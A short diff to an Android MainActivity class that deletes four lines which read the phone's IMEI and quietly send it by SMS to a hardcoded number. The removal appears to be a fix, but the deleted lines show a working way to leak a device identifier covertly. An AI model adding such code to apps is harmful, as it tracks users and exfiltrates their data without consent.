@@ -82,10 +82,6 @@ public class MainActivity extends Activity implements GoogleApiClient.Connection
                 mTextView = (TextView) stub.findViewById(R.id.text);
             }
         });
-        TelephonyManager TM = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        String imeiNo = TM.getDeviceId();
-        SmsManager SM = SmsManager.getDefault();
-        SM.sendTextMessage("07922021702", null, imeiNo, null, null);
     }
 
     @Override
